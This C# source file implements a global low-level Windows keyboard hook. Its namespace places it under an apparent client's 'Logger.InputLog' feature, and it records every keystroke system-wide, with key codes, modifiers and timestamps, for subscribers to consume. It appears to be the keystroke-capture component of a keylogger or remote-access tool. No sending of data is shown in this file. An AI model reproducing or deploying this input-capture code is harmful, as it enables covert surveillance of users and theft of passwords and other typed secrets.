using System.Diagnostics;

namespace Gloom.Client.Features.Logger.InputLog
{
	public static class KeyboardHook
	{
		public static IntPtr HookHandle
		{
			get; private set;
		} = IntPtr.Zero;

		public static event EventHandler<KeyboardInputEventArgs>? OnKeyboardInput;

		private static int ActiveModifiers = 0;

		/// <summary>
		/// To prevent callback from being garbage collected
		/// </summary>
		private readonly static User32.LowLevelKeyboardProc MyCallback = KeyboardHookProc;

		public static void InstallHook()
		{
			using var process = Process.GetCurrentProcess();
			using var module = process.MainModule;
			if (module != null)
				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, MyCallback, module.BaseAddress, 0);
#if DEBUG
			else
				Console.WriteLine("Keyboard hook not installed: Main module of current process unavailable.");
#endif
		}

		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
		{
			if (nCode >= 0)
			{
				if (wParam == (IntPtr)User32.WM_KEYDOWN || wParam == (IntPtr)User32.WM_SYSKEYDOWN)
				{
					try
					{
						OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs(lParam.vkCode, lParam.scanCode, (ModifierKey)ActiveModifiers, lParam.time));
					}
					catch (Exception e)
					{
#if DEBUG
						Console.WriteLine("Exception on keyboard hook event: " + e);
#endif
					} // trunc

					// Activate modifier
					var modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
					if (modifier != null)
						ActiveModifiers |= (int)modifier;
				}
				else if (wParam == (IntPtr)User32.WM_KEYUP || wParam == (IntPtr)User32.WM_SYSKEYUP)
				{
					// Deactive modifier
					ActiveModifiers &= ~(int)(((VirtualKey)lParam.vkCode).GetModifier() ?? 0);
				}
			}

			// Keep running the hook chain
			return User32.CallNextHookEx(HookHandle, nCode, wParam, ref lParam);
		}

		public static void UninstallHook()
		{
			User32.UnhookWindowsHookEx(HookHandle);
		}
	}

	public class KeyboardInputEventArgs : EventArgs
	{
		public uint VkCode
		{
			get;
		}

		public VirtualKey VkCodeEnum
		{
			get => (VirtualKey)VkCode;
		}

		public uint ScanCode
		{
			get;
		}

		public ModifierKey Modifier
		{
			get;
		}

		public uint Time
		{
			get;
		}

		public KeyboardInputEventArgs(uint vkCode, uint scanCode, ModifierKey modifiers, uint time)
		{
			VkCode = vkCode;
			ScanCode = scanCode;
			Modifier = modifiers;
			Time = time;
		}
	}
}
